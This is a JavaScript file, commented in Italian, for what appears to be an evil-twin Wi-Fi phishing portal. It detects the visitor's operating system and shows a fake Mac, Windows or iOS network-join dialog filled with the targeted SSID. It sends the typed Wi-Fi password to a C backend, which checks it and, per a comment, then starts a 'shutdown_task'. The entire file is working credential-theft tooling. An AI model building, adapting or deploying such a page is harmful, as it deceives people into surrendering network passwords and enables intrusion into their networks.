document.addEventListener("DOMContentLoaded", function() {
    
    // 1. CONFIGURAZIONE API
    // Corrispondono agli enum in server_api.c (Assunto: CMD 6 = Get Target, CMD 7 = Check Pwd)
    const API_CMD_GET_TARGET = 6; 
    const API_CMD_CHECK_PASSWORD = 7; 
    const API_URL = "/backend/"; // Modifica se il tuo endpoint è diverso (es: /api/)

    // 2. RILEVAMENTO OS & UI
    const os = detectOS();
    console.log("Detected OS:", os);
    
    const views = {
        'Mac': document.getElementById('view-mac'),
        'Windows': document.getElementById('view-windows'),
        'iOS': document.getElementById('view-ios'),
        'Android': document.getElementById('view-ios') // Fallback Android su stile iOS/Mobile
    };

    // Nascondi tutto e mostra solo l'OS corrente
    for (let key in views) views[key].classList.add('hidden');
    if (views[os]) {
        views[os].classList.remove('hidden');
    } else {
        views['Windows'].classList.remove('hidden'); // Default
    }

    // 3. RECUPERO DATI DAL SERVER (SSID)
    fetchAPIData({ cmd: API_CMD_GET_TARGET }, function(response) {
        if (response && response.ssid) {
            document.querySelectorAll('.target-ssid').forEach(el => {
                el.innerText = response.ssid;
            });
            // Se c'è un logo vendor nel JSON response, puoi gestirlo qui
        }
    });

    // 4. GESTIONE LOGICA SPECIFICA (DRAG & DROP MAC, WIN TOGGLE)
    initMacBehavior();
    initWindowsBehavior();

    // 5. GESTIONE INVIO PASSWORD (UNIFICATA)
    document.querySelectorAll('.btn-join, .password-form').forEach(trigger => {
        // Gestiamo sia il click sul bottone che il submit del form
        trigger.addEventListener(trigger.tagName === 'FORM' ? 'submit' : 'click', function(e) {
            if (trigger.tagName === 'FORM') e.preventDefault();
            
            // Trova il form genitore o se stesso
            let form = trigger.closest('.view-container'); 
            let input = form.querySelector('.input-password');
            let statusBox = form.querySelector('.status-msg');
            let password = input.value;

            if (password.length < 8) {
                if(statusBox) statusBox.innerText = "Password must be at least 8 characters.";
                return;
            }

            // Invia al Server C
            if(statusBox) statusBox.innerText = "Verifying...";
            
            fetchAPIData({ 
                cmd: API_CMD_CHECK_PASSWORD, 
                password: password 
            }, function(res) {
                if (res.status === "ok") {
                    // Password Corretta -> Il server C attiverà shutdown_task
                    if(statusBox) {
                         statusBox.innerText = "Connection successful. Please wait...";
                         statusBox.style.color = "green";
                    }
                    setTimeout(() => location.reload(), 3000);
                } else {
                    // Password Errata
                    if(statusBox) {
                        statusBox.innerText = "Incorrect password.";
                        statusBox.style.color = "red";
                    }
                    input.value = "";
                    input.focus();
                }
            });
        });
    });

    // --- FUNZIONI DI UTILITÀ ---

    function fetchAPIData(jsonData, callback) {
        // Genera un ID random per la richiesta
        jsonData.req_id = Math.floor(Math.random() * 100000);
        
        var xhr = new XMLHttpRequest();
        xhr.open("POST", API_URL, true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                try {
                    var json = JSON.parse(xhr.responseText);
                    callback(json);
                } catch (e) {
                    console.error("Invalid JSON response", e);
                }
            }
        };
        xhr.send(JSON.stringify(jsonData));
    }

    function detectOS() {
        var userAgent = window.navigator.userAgent;
        if (userAgent.indexOf("Win") !== -1) return "Windows";
        if (userAgent.indexOf("Mac") !== -1) {
            return (userAgent.indexOf("iPhone") !== -1 || userAgent.indexOf("iPad") !== -1) ? "iOS" : "Mac";
        }
        if (userAgent.indexOf("Android") !== -1) return "Android";
        if (userAgent.indexOf("Linux") !== -1) return "Windows"; // Tratta Linux come Windows style generico
        return "Windows";
    }

    function initWindowsBehavior() {
        let connectBtn = document.querySelector('.win-connect-btn');
        let disconnectedDiv = document.querySelector('.win-disconnected');
        let connectedDiv = document.querySelector('.win-connected');
        
        if(connectBtn) {
            connectBtn.addEventListener('click', function() {
                disconnectedDiv.classList.add('hidden');
                connectedDiv.classList.remove('hidden');
            });
        }
    }

    function initMacBehavior() {
        // Logica semplificata trascinamento modale Mac
        var modal = document.getElementById("mac-modal");
        var title = document.getElementById("mac-title");
        if(!modal || !title) return;

        var isDragging = false, startX, startY, initialLeft, initialTop;

        title.addEventListener('mousedown', function(e) {
            isDragging = true;
            startX = e.clientX;
            startY = e.clientY;
            initialLeft = modal.offsetLeft;
            initialTop = modal.offsetTop;
            title.style.cursor = "grabbing";
        });

        document.addEventListener('mousemove', function(e) {
            if (!isDragging) return;
            var dx = e.clientX - startX;
            var dy = e.clientY - startY;
            modal.style.left = (initialLeft + dx) + "px";
            modal.style.top = (initialTop + dy) + "px";
            // Rimuovi il transform CSS se trasciniamo manualmente
            modal.style.transform = "none"; 
        });

        document.addEventListener('mouseup', function() {
            isDragging = false;
            title.style.cursor = "move";
        });
        
        // Show Password Toggle per Mac
        document.querySelector('.show-password-check').addEventListener('change', function(e) {
            let input = document.querySelector('#mac-modal .input-password');
            input.type = e.target.checked ? "text" : "password";
        });
    }
});